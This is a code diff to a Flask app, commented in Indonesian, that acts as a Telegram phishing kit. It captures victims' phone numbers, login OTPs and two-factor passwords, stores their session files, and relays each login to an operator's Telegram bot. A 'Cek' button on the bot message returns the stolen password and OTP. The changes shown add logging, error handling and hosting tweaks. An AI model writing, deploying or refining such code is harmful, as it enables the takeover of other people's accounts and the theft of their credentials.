@@ -10,7 +10,7 @@ import requests
 from datetime import datetime
 from flask import Flask, render_template, request, redirect, url_for, session, flash, jsonify
 
-# ==== FIX SQLITE ====
+# ==== FIX SQLITE ====  (Railway / Linux)
 try:
     import sys
     import pysqlite3
@@ -40,7 +40,7 @@ SESSION_DIR = "sessions"
 os.makedirs(SESSION_DIR, exist_ok=True)
 
 # ===== STORAGE =====
-LAST_DATA = {}
+LAST_DATA = {}  # { phone: {"otp":..., "password":...} }
 
 
 def save_data(phone, otp=None, password=None):
@@ -56,52 +56,77 @@ def get_data(phone):
     return LAST_DATA.get(phone, {"otp": None, "password": None})
 
 
-# ===== INLINE BUTTON =====
+# ===== INLINE BUTTON WEBHOOK =====
 @app.route("/bot", methods=["POST"])
 def bot_webhook():
-    data = request.get_json()
-    if "callback_query" in data:
-        q = data["callback_query"]
-        cid = q["message"]["chat"]["id"]
-        cb = q["data"]
+    # Baca JSON dengan aman + logging
+    data = request.get_json(silent=True) or {}
+    print("== /bot CALLBACK RECEIVED ==")
+    print(data)
 
-        if cb.startswith("cek_"):
-            phone = cb.replace("cek_", "")
-            info = get_data(phone)
+    if "callback_query" not in data:
+        return jsonify({"ok": True})
 
-            if not info["otp"]:
-                txt = "❌ Silahkan login terlebih dahulu untuk mendapatkan OTP baru"
-            else:
-                txt = (
-                    f"🔐 Password: {info['password'] or '-'}\n"
-                    f"🔑 OTP: {info['otp']}"
-                )
+    q = data["callback_query"]
+    cid = q["message"]["chat"]["id"]
+    cb = q.get("data", "")
+    cb_id = q.get("id")
 
+    # Jawab callback agar loading di Telegram berhenti
+    if cb_id:
+        try:
             requests.post(
+                f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery",
+                data={"callback_query_id": cb_id}
+            )
+        except Exception as e:
+            print("[BOT] answerCallbackQuery error:", e)
+
+    if cb.startswith("cek_"):
+        phone = cb.replace("cek_", "")
+        info = get_data(phone)
+
+        if not info["otp"]:
+            txt = "❌ Silahkan login terlebih dahulu untuk mendapatkan OTP baru"
+        else:
+            txt = (
+                f"🔐 Password: {info['password'] or '-'}\n"
+                f"🔑 OTP: {info['otp']}"
+            )
+
+        try:
+            r = requests.post(
                 f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                 data={"chat_id": cid, "text": txt}
             )
+            print("[BOT] sendMessage status:", r.status_code, r.text)
+        except Exception as e:
+            print("[BOT] sendMessage error:", e)
+
     return jsonify({"ok": True})
 
 
-# ===== SEND TO BOT =====
+# ===== SEND LOGIN INFO KE BOT =====
 def send_login_message(phone):
     waktu = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-
     text = f"📞 Nomor: {phone}\n🕒 Login: {waktu}"
 
-    requests.post(
-        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-        data={
-            "chat_id": CHAT_ID,
-            "text": text,
-            "reply_markup": json.dumps({
-                "inline_keyboard": [
-                    [{"text": "🔍 Cek", "callback_data": f"cek_{phone}"}]
-                ]
-            })
-        }
-    )
+    try:
+        r = requests.post(
+            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+            data={
+                "chat_id": CHAT_ID,
+                "text": text,
+                "reply_markup": json.dumps({
+                    "inline_keyboard": [
+                        [{"text": "🔍 Cek", "callback_data": f"cek_{phone}"}]
+                    ]
+                })
+            }
+        )
+        print("[BOT] login message status:", r.status_code, r.text)
+    except Exception as e:
+        print("[BOT] login message error:", e)
 
 
 # ===== SESSION MANAGEMENT =====
@@ -220,7 +245,6 @@ def otp():
 def api_otp():
     phone = session.get("phone")
     code = request.form.get("otp")
-
     pending = os.path.join(SESSION_DIR, f"{phone}.pending")
 
     async def run():
@@ -292,7 +316,6 @@ def password():
 def api_password():
     phone = session.get("phone")
     pwd = request.form.get("password")
-
     pending = os.path.join(SESSION_DIR, f"{phone}.pending")
 
     async def run():
@@ -352,7 +375,7 @@ async def worker_main():
 
             real_session = os.path.join(SESSION_DIR, base + ".session")
 
-            # copy to temp
+            # copy to temp (hindari database locked)
             temp_db = os.path.join(tempfile.gettempdir(), f"{base}.sqlite")
             try:
                 shutil.copy2(real_session, temp_db)
@@ -396,7 +419,9 @@ def start_worker_thread():
     t.start()
 
 
-# ===== MAIN =====
+# ===== PANGGIL WORKER SELALU (lokal & Railway) =====
+start_worker_thread()
+
+# ===== MAIN UNTUK LOKAL =====
 if __name__ == "__main__":
-    start_worker_thread()
     app.run(host="0.0.0.0", port=8080, debug=True)
